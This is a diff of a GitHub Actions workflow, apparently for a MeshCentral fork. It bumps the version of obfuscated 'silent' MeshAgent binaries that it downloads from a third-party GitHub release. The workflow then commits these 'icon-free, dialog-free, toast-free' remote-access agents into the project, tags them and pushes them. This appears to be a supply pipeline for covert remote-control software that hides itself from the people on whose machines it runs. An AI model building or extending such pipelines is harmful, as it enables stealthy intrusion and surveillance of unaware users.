@@ -10,9 +10,9 @@ jobs:
       - name: Checkout MeshCentral
         uses: actions/checkout@v4
 
-      - name: Download silent agent binaries (MeshAgent 1.2.6-obf.1)
+      - name: Download silent agent binaries (MeshAgent 1.2.6-obf.2)
         run: |
-          BASE=https://github.com/fcmatch121/MeshAgent/releases/download/1.2.6-obf.1
+          BASE=https://github.com/fcmatch121/MeshAgent/releases/download/1.2.6-obf.2
           mkdir -p silentbin && cd silentbin
           for f in MeshService.exe MeshService64.exe MeshServiceARM64.exe meshagent_aarch64 meshagent_alpine-x86-64 meshagent_armhf meshagent_freebsd_x86-64 meshagent_osx-arm-64 meshagent_osx-x86-64 meshagent_x86 meshagent_x86-64 meshagent_x86-64_nokvm meshagent_x86_nokvm SHA384SUMS.txt; do
             curl -sfLO "$BASE/$f" || echo "download fail: $f"
@@ -73,6 +73,6 @@ jobs:
           git config user.email "actions@users.noreply.github.com"
           git config user.name "MeshAgent CI"
           git add agents
-          git commit -m "Ship silent StressMan agents: icon-free, dialog-free, toast-free agent binaries (MeshAgent 1.2.6-obf.1) with refreshed hashagents.json"
-          git tag 1.2.6-obf.1
+          git commit -m "Ship silent StressMan agents: icon-free, dialog-free, toast-free agent binaries (MeshAgent 1.2.6-obf.2) with refreshed hashagents.json"
+          git tag 1.2.6-obf.2
           git push origin master --tags
